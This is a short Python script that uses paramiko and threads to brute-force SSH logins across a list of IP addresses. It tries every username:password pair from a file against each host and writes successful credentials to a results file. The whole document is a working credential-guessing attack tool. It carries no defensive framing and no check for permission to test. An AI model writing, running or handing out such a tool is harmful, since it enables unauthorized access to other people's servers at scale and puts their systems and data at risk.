import threading
import paramiko

# creating a set to keep track of failed login attempts
failed_attempts = set()

# function that will be executed by each thread
def ssh_connect(ip, user_pass_list):
    ssh_client = paramiko.SSHClient()
    ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    for user, password in user_pass_list:
        # check if the current user and password combination has already failed
        if (ip, user, password) in failed_attempts:
            continue
        print(f"Trying login at IP: {ip} with User: {user} and Password: {password}")
        try:
            ssh_client.connect(ip, username=user, password=password, timeout=10)
            print(f"Success at IP: {ip} with User: {user} and Password: {password}")
            with open("result.txt", "a") as f:
                f.write(f"Success: IP: {ip} User: {user} Password: {password}\n")
            break
        except paramiko.ssh_exception.AuthenticationException:
            failed_attempts.add((ip, user, password))
            pass
        except paramiko.ssh_exception.SSHException as e:
            print(f"Unknown failure at IP: {ip} with User: {user} and Password: {password}, error: {e}")
            with open("result.txt", "a") as f:
                f.write(f"Unknown failure: IP: {ip} User: {user} Password: {password} error: {e}\n")
            break
        except Exception as e:
            print(f"IP address {ip} does not respond to connection: {e}")
            continue
    ssh_client.close()

# list of IP addresses
ip_list = []
with open("ipup.txt", "r") as f:
    for line in f:
        ip_list.append(line.strip())

# list of users and passwords
user_pass_list = []
with open("userpass.txt", "r") as f:
    for line in f:
        user_pass_list.append(tuple(line.strip().split(':')))

# creating and starting the threads
threads = []
for ip in ip_list:
    t = threading.Thread(target=ssh_connect, args=(ip, user_pass_list))
    threads.append(t)
    t.start()

# waiting for threads to finish
for t in threads:
    t.join()